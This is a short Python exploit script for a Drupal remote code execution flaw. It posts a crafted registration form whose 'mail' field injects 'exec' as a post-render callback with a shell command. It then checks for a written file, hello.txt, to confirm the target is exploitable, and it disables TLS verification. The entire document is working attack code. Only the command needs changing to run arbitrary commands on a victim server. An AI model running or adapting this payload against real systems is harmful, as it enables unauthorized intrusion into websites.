#!/usr/bin/env
import sys
import requests
import urllib3
urllib3.disable_warnings()
target = sys.argv[1]


url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo ";-)" | tee hello.txt'}

r = requests.post(url, data=payload, verify=False)
check = requests.get(target + 'hello.txt')
if check.status_code != 200:
  sys.exit("Not exploitable")
print ('\nCheck: '+target+'hello.txt')